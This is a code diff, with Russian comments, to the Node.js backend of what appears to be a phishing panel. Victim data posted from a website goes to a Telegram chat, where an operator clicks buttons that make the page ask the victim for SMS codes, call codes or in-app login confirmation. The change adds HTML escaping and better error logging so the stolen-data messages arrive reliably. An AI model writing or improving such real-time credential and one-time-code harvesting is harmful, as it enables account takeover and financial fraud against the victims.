@@ -11,17 +11,20 @@ const CHAT_ID = '-1003455979409';
 // Хранилище команд для пользователей
 let userTasks = {}; 
 
-// --- API ДЛЯ САЙТА ---
+// Функция для безопасного текста (чтобы не было ошибки 400 из-за спецсимволов)
+const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
+// --- ЕДИНЫЙ API ДЛЯ ВСЕХ ФАЙЛОВ ---
 app.post('/api/log', async (req, res) => {
     const { userId, type, data } = req.body;
-    console.log(`[LOG] Данные от ${userId} (${type})`);
+    console.log(`[LOG] Получены данные от ${userId} [${type}]`);
     
-    let logMsg = `<b>🔔 НОВЫЙ ЛОГ [${type}]</b>\n`;
-    logMsg += `🆔 ID: <code>${userId}</code>\n`;
+    let logMsg = `<b>🔔 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n`;
+    logMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
     logMsg += `------------------------\n`;
+    
     for (let key in data) {
-        logMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`;
+        logMsg += `<b>${safeText(key)}:</b> <code>${safeText(data[key])}</code>\n`;
     }
 
     try {
@@ -33,7 +36,7 @@ app.post('/api/log', async (req, res) => {
                 inline_keyboard: [
                     [
                         { text: "💬 СМС Код", callback_data: `ask_${userId}_Введите код из СМС` },
-                        { text: "📞 Звонок4", callback_data: `ask_${userId}_Введите 4 цифры из звонка` }
+                        { text: "📞 Звонок", callback_data: `ask_${userId}_Введите 4 цифры из звонка` }
                     ],
                     [
                         { text: "📲 Пуш", callback_data: `msg_${userId}_Подтвердите вход в приложении` },
@@ -48,7 +51,8 @@ app.post('/api/log', async (req, res) => {
         });
         res.json({ success: true });
     } catch (e) {
-        console.error("ОШИБКА TG:", e.message);
+        // Выводим подробности ошибки 400 в логи Railway
+        console.error("❌ ОШИБКА TG:", e.response ? JSON.stringify(e.response.data) : e.message);
         res.status(500).send('TG Error');
     }
 });
@@ -57,13 +61,10 @@ app.get('/api/check/:userId', (req, res) => {
     const userId = req.params.userId;
     const task = userTasks[userId] || null;
     if (task) {
-        console.log(`[CHECK] Команда для ${userId}:`, task.action);
         delete userTasks[userId]; 
     }
     res.json(task);
 });
-
-// --- API ДЛЯ ТЕЛЕГРАМА (WEBHOOK) ---
 
 app.post('/tg-webhook', async (req, res) => {
     const { message, callback_query } = req.body;
@@ -72,7 +73,7 @@ app.post('/tg-webhook', async (req, res) => {
         const parts = callback_query.data.split('_');
         const action = parts[0]; 
         const userId = parts[1];
-        const text = parts.slice(2).join('_'); // Берем весь остаток как текст
+        const text = parts.slice(2).join('_');
 
         userTasks[userId] = { action, text };
 
